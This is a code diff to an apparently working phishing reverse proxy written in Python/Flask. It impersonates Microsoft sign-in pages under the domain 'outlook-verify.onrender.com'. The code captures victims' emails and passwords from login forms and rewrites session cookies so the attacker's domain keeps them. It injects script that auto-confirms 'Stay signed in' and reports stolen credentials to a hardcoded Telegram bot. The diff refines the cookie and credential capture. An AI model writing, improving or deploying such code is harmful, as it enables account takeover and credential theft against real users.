@@ -1,5 +1,4 @@
 import os
-import re
 import uuid
 import requests
 from flask import Flask, request, Response
@@ -11,11 +10,7 @@ TELEGRAM_BOT_TOKEN = "8998925422:AAFKDgRkGsFewhlRC6tDmrGa33a6yNxj9UY"
 TELEGRAM_CHAT_ID = "8877118461"
 
 PROXY_DOMAIN = "https://outlook-verify.onrender.com"
-
-UPSTREAMS = {
-    "login.microsoftonline.com": "login.microsoftonline.com",
-    "login.live.com": "login.live.com",
-}
+PROXY_HOST = "outlook-verify.onrender.com"
 
 # vid -> requests.Session (per victim)
 visitor_sessions = {}
@@ -56,40 +51,56 @@ def check_and_send(vid):
         send_telegram(msg)
 
 
+# --- Multi-value Set-Cookie extraction (works on urllib3 v1 and v2) ---
+def get_set_cookies(resp):
+    """
+    requests' resp.headers merges repeated Set-Cookie headers with ', '
+    which breaks cookies that contain 'Expires=Wed, 15 Nov 2026 ...'.
+    Read the raw urllib3 header dict instead.
+    """
+    raw = getattr(resp, "raw", None)
+    raw_headers = getattr(raw, "headers", None)
+    if raw_headers is not None:
+        for attr in ("getlist", "get_all"):
+            fn = getattr(raw_headers, attr, None)
+            if fn is None:
+                continue
+            try:
+                values = fn("Set-Cookie")
+            except Exception:
+                continue
+            if values:
+                return [v for v in values if v]
+    merged = resp.headers.get("Set-Cookie")
+    return [merged] if merged else []
+
+
 # --- Rewriting helpers ---
 def rewrite_links(text):
-    # Point both upstream hosts back at our proxy everywhere in HTML/JS
     text = text.replace("https://login.microsoftonline.com", PROXY_DOMAIN)
     text = text.replace("https://login.live.com", PROXY_DOMAIN)
-    text = text.replace("//login.microsoftonline.com", "//outlook-verify.onrender.com")
-    text = text.replace("//login.live.com", "//outlook-verify.onrender.com")
+    text = text.replace("//login.microsoftonline.com", "//" + PROXY_HOST)
+    text = text.replace("//login.live.com", "//" + PROXY_HOST)
     return text
 
 
 def fix_set_cookie(header_value):
     """
-    Rewrite a Set-Cookie value so the victim's browser actually stores it:
-    - Strip Domain=... (browser then binds it to our own domain)
-    - Force Path=/ so it is sent on every subsequent proxied request
+    Strip Domain= and Path= so the victim's browser stores the cookie
+    under our own domain, then force Path=/ so it is echoed on every
+    proxied request.
     """
-    parts = header_value.split(";")
-    kept = []
-    for p in parts:
-        lower = p.strip().lower()
-        if lower.startswith("domain=") or lower.startswith("path="):
-            continue
-        kept.append(p)
-    value = ";".join(kept)
-    # Re-add Path=/ so the cookie applies site-wide
-    if "secure" in value.lower() or "=" in value:
-        value += "; Path=/"
-    return value
+    parts = [p.strip() for p in header_value.split(";") if p.strip()]
+    kept = [
+        p for p in parts
+        if not p.lower().startswith("domain=") and not p.lower().startswith("path=")
+    ]
+    if not kept or "=" not in kept[0]:
+        return header_value
+    kept.append("Path=/")
+    return "; ".join(kept)
 
 
-# --- Determine which upstream this path belongs to ---
-# We mark sessions with a hidden prefix in the vid cookie per host is overkill;
-# instead keep ONE session per victim and use it for both hosts (cookies are
-# stored per-host inside requests.Session automatically).
 def get_session(vid, user_agent):
     if vid not in visitor_sessions:
         s = requests.Session()
@@ -102,12 +113,6 @@ def get_session(vid, user_agent):
 
 
 def pick_upstream(path):
-    """
-    Microsoft's flow bounces between login.microsoftonline.com and login.live.com.
-    We keep the same path on both (their shared auth endpoints line up closely),
-    defaulting to login.microsoftonline.com.
-    """
-    # Paths that belong to login.live.com
     if path.startswith(("GetCredentialType.srf", "ppsecure/", "api/")):
         return "https://login.live.com"
     return "https://login.microsoftonline.com"
@@ -128,15 +133,13 @@ def proxy(path):
     if request.query_string:
         target += "?" + request.query_string.decode()
 
-    # Forward useful headers
     headers = {}
-    for h in ["Accept", "Accept-Language", "Content-Type", "Origin"]:
+    for h in ("Accept", "Accept-Language", "Content-Type", "Origin"):
         if h in request.headers:
             headers[h] = request.headers[h]
     if "Referer" in request.headers:
-        headers["Referer"] = (
-            request.headers["Referer"]
-            .replace(PROXY_DOMAIN, "https://login.microsoftonline.com")
+        headers["Referer"] = request.headers["Referer"].replace(
+            PROXY_DOMAIN, "https://login.microsoftonline.com"
         )
     if "Origin" in headers:
         headers["Origin"] = "https://login.microsoftonline.com"
@@ -155,24 +158,30 @@ def proxy(path):
     # --- Capture credentials from the login POST ---
     if request.method == "POST":
         passwd = request.form.get("passwd") or request.form.get("Password")
-        login = request.form.get("loginfmt") or request.form.get("login") or request.form.get("username")
+        login = (
+            request.form.get("loginfmt")
+            or request.form.get("login")
+            or request.form.get("username")
+        )
         if passwd:
-            CAPTURED[vid] = {"email": login, "password": passwd, "sent": False}
+            prev = CAPTURED.get(vid, {})
+            CAPTURED[vid] = {
+                "email": login or prev.get("email"),
+                "password": passwd,
+                "sent": prev.get("sent", False),
+            }
 
     # --- Build response ---
     r = Response(status=resp.status_code)
 
-    # Redirects: rewrite Location to our proxy (BOTH hosts now)
     if "Location" in resp.headers:
         loc = resp.headers["Location"]
         loc = loc.replace("https://login.microsoftonline.com", PROXY_DOMAIN)
         loc = loc.replace("https://login.live.com", PROXY_DOMAIN)
-        # Relative or host-relative redirects also get normalized
         if loc.startswith("/"):
             loc = PROXY_DOMAIN + loc
         r.headers["Location"] = loc
 
-    # Content
     content_type = resp.headers.get("Content-Type", "")
     body = resp.content
 
@@ -182,11 +191,10 @@ def proxy(path):
         inject = """
         <script>
         (function(){
-          // Auto-confirm "Stay signed in?" (KMSI) so the persistent cookie lands fast
           if (location.href.indexOf('kmsi') !== -1) {
             var f = document.querySelector('form');
             if (f) {
-              var btn = f.querySelector('input[type=submit][value="Yes"], #idSIButton9, button');
+              var btn = f.querySelector('#idSIButton9, input[type=submit][value="Yes"], button');
               if (btn) { setTimeout(function(){ btn.click(); }, 600); }
             }
           }
@@ -204,12 +212,11 @@ def proxy(path):
     if content_type:
         r.headers["Content-Type"] = content_type
 
-    # Pass Set-Cookie through, fixed so the browser keeps them
-    for value in resp.headers.get_all("Set-Cookie", []):
+    for value in get_set_cookies(resp):
         r.headers.add("Set-Cookie", fix_set_cookie(value))
 
     if new_vid:
-        r.set_cookie("vid", vid, max_age=86400, path="/")
+        r.set_cookie("vid", vid, max_age=86400, path="/", samesite="Lax")
 
     check_and_send(vid)
     return r
